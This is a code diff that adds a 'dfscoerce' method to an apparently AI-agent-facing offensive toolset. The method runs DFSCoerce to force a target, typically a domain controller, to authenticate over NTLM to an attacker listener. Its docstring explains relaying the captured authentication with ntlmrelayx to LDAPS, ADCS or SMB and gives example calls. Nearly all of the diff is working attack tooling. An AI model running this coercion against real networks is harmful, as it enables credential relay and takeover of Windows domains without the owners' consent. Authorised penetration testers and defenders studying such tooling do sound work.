@@ -151,6 +151,61 @@ class CoercionTools(Toolset):
         except Exception as e:
             return f"Coercer failed: {e}"
 
+    @dn.tool_method
+    def dfscoerce(
+        self,
+        target: str,
+        listener: str,
+        username: str = "",
+        password: str = "",
+        domain: str = "",
+    ) -> str:
+        """
+        Coerce NTLM authentication via MS-DFSNM (DFSCoerce).
+
+        Similar to PetitPotam but uses the DFS protocol (MS-DFSNM).
+        Use with ntlmrelayx for relay attacks to LDAPS, ADCS, or SMB.
+
+        Args:
+            target: Target machine to coerce (typically a DC)
+            listener: Attacker listener IP (running ntlmrelayx)
+            username: Username for authenticated coercion (optional)
+            password: Password for authentication (optional)
+            domain: Domain for authentication (optional)
+
+        Returns:
+            Coercion result indicating success or failure
+
+        Example:
+            >>> dfscoerce("192.168.58.10", "192.168.58.100")
+            >>> dfscoerce("192.168.58.10", "192.168.58.100", "user", "pass", "contoso.local")
+        """
+        cmd = ["dfscoerce", "-t", target, "-l", listener]
+
+        if username and password:
+            cmd.extend(["-u", username, "-p", password])
+            if domain:
+                cmd.extend(["-d", domain])
+
+        try:
+            logger.info(f"[*] Running DFSCoerce against {target}")
+            stdout, stderr, _ = run_tool(cmd, timeout_seconds=60)
+
+            result = stdout + "\n" + (stderr or "")
+
+            if "success" in result.lower() or "worked" in result.lower():
+                logger.info("[+] DFSCoerce coercion successful!")
+                result = (
+                    f"🚨 DFSCOERCE SUCCESSFUL!\n"
+                    f"→ Target {target} authenticating to {listener}\n"
+                    "→ Check ntlmrelayx/Responder for captured auth\n\n" + result
+                )
+
+            return result
+
+        except Exception as e:
+            return f"DFSCoerce failed: {e}"
+
 
 class CoercionNetworkTools(Toolset):
     """Tools for network-based authentication capture and relay.
